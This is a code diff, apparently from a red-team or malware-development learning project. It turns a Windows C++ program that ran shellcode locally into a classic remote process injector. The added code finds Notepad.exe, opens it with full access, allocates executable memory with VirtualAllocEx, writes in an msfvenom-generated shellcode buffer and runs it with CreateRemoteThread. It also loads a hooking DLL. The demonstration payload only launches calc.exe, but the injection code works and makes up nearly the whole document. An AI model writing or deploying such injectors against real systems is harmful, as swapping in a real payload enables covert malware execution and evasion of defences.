@@ -1,13 +1,55 @@
 #include <windows.h>
+#include <string>
 #include <iostream>
+#include <tlhelp32.h>
 
+// Function to search for a process by name and return its PID
+DWORD GetProcessIdByName(const std::wstring& processName) {
+	// Take a snapshot of all processes
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		std::cerr << "Failed to take a snapshot of processes." << std::endl;
+		return 0;
+	}
 
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	// Iterate through processes to find the target process
+	if (Process32First(hSnapshot, &pe32)) {
+		do {
+			// Convert pe32.szExeFile (C-style string) to std::string for comparison
+			if (std::wstring(pe32.szExeFile) == processName) {
+				DWORD pid = pe32.th32ProcessID;  // Get the PID of the found process
+				CloseHandle(hSnapshot);
+				return pid;  // Return the PID of the process
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	// If process not found
+	CloseHandle(hSnapshot);
+	return 0;  // Return 0 if process not found
+}
 int main() {
-	HMODULE hDLL = LoadLibraryA("vhook.dll");
-	if (hDLL == NULL) {
+	const std::wstring targetProcessName = L"Notepad.exe";
+	std::wcout << "Searching for process " << targetProcessName << std::endl;
+	DWORD pid = GetProcessIdByName(targetProcessName);
+	if (pid == 0) {
+		std::cout << "process not found...exiting!" << std::endl;
+		system("pause");
 		return 1;
 	}
-	Sleep(2000);
+
+	// Load the DLL
+	HMODULE hDll = LoadLibraryA("vhook.dll");
+	if (hDll == NULL) {
+		return 1;
+	}
+	Sleep(5000);
+	// initialize our process handle variable and buffer pointer
+	HANDLE pHandle = NULL;
+	PVOID rBuffer = NULL;
 
 	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c
 	unsigned char buf[] =
@@ -32,30 +74,81 @@ int main() {
 		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-	//LPVOID VirtualAlloc(
-	//	[in, optional] LPVOID lpAddress, 
+	//HANDLE OpenProcess(
+	//	[in] DWORD dwDesiredAccess,
+	//	[in] BOOL  bInheritHandle,
+	//	[in] DWORD dwProcessId
+	//);
+	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+	pHandle = OpenProcess(
+		PROCESS_ALL_ACCESS, // All possible access rights for a process object. -> https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
+		FALSE,				// If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.
+		DWORD(pid));		// The identifier of the local process to be opened.
+	printf("Got handle to pid [%i] Handle is: %p\n", pid, pHandle);
+
+	system("pause");
+
+	//LPVOID VirtualAllocEx(
+	//	[in]           HANDLE hProcess,
+	//	[in, optional] LPVOID lpAddress,
 	//	[in]           SIZE_T dwSize,
 	//	[in]           DWORD  flAllocationType,
 	//	[in]           DWORD  flProtect
 	//);
-	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
-	void* exec = VirtualAlloc(
-		0,							// If this parameter is NULL, the system determines where to allocate the region
-		sizeof(buf),				// size of buf (shellcode)
-		MEM_COMMIT | MEM_RESERVE,	// To reserve and commit pages in one step, call VirtualAlloc with MEM_COMMIT | MEM_RESERVE
-		PAGE_EXECUTE_READWRITE);	// When allocating dynamic memory for an enclave, the flProtect parameter must be PAGE_READWRITE or PAGE_EXECUTE_READWRITE
-	printf("Allocted memory for shellcode: %p\n", exec);
+	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
+	rBuffer = VirtualAllocEx(
+		pHandle,					// The handle to a process.
+		NULL,						// If lpAddress is NULL, the function determines where to allocate the region
+		sizeof(buf),				// The size of the region of memory to allocate, in bytes.
+		MEM_COMMIT | MEM_RESERVE,	// To reserve and commit pages in one step, call VirtualAllocEx with MEM_COMMIT | MEM_RESERVE.
+		PAGE_EXECUTE_READWRITE);	// When allocating dynamic memory for an enclave, the flProtect parameter must be PAGE_READWRITE or PAGE_EXECUTE_READWRITE.
+	printf("Allocted memory for shellcode: %p\n", rBuffer);
 
-	// https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170
-	memcpy(
-		exec,				// dest; New buffer
-		buf,				// src; Buffer to copy from
-		sizeof(buf));		// count; Number of characters to copy
-	printf("Moved shellcode into allocated memory: %p\n", exec);
 	system("pause");
-	((void(*)())exec)();
 
-	FreeLibrary(hDLL);
+	//BOOL WriteProcessMemory(
+	//	[in]  HANDLE  hProcess,
+	//	[in]  LPVOID  lpBaseAddress,
+	//	[in]  LPCVOID lpBuffer,
+	//	[in]  SIZE_T  nSize,
+	//	[out] SIZE_T * lpNumberOfBytesWritten
+	//);
+	WriteProcessMemory(
+		pHandle,		// A handle to the process memory to be modified.
+		rBuffer,		// A pointer to the base address in the specified process to which data is written.
+		buf,			// A pointer to the buffer that contains data to be written in the address space of the specified process.
+		sizeof(buf),	// The number of bytes to be written to the specified process.
+		NULL);			// A pointer to a variable that receives the number of bytes transferred into the specified process.
+	printf("Wrote shellcode into process memory of PID: %i\n", pid);
+
+	system("pause");
+
+	//HANDLE CreateRemoteThread(
+	//	[in]  HANDLE                 hProcess,
+	//	[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+	//	[in]  SIZE_T                 dwStackSize,
+	//	[in]  LPTHREAD_START_ROUTINE lpStartAddress,
+	//	[in]  LPVOID                 lpParameter,
+	//	[in]  DWORD                  dwCreationFlags,
+	//	[out] LPDWORD                lpThreadId
+	//);
+	// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
+	HANDLE hThread = CreateRemoteThread(
+		pHandle,							// A handle to the process in which the thread is to be created.
+		NULL,								// *SECURITY ATTRIBUTES If lpThreadAttributes is NULL, the thread gets a default security descriptor and the handle cannot be inherited
+		0,									// The initial size of the stack, in bytes.
+		(LPTHREAD_START_ROUTINE)rBuffer,	// A pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed
+		NULL,								// A pointer to a variable to be passed to the thread function.
+		0,									// 	The thread runs immediately after creation.
+		NULL);								// If this parameter is NULL, the thread identifier is not returned.
+	printf("Remote thread %p created in PID : %i\n", hThread, pid);
+
+	//BOOL CloseHandle(
+	//	[in] HANDLE hObject
+	//);
+	// https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
+	CloseHandle(hThread); // A valid handle to an open object.
+	CloseHandle(pHandle);
 
 	return 0;
 }
